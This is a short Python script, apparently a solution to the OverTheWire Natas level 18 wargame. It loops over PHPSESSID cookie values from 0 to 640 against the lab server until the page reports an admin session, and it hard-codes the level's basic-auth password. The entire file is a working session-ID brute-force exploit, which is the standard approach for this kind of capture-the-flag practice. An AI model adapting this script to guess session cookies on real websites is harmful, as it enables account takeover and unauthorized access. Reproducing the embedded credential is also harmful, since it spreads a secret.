'''
Created on Aug 22, 2018

'''

import requests
from requests.auth import HTTPBasicAuth

for i in range(0, 641):    
    my_data = {'username': 'admin', 'password': 'admin'}
    cookie = {'PHPSESSID': '{0}'.format(i)}
    r = requests.post("http://natas18.natas.labs.overthewire.org/index.php?debug", 
                      data=my_data, 
                      cookies=cookie,
                      auth=HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'))
    
    print(i)
    if (i > 638 or "You are an admin" in r.text):
        print(r.text)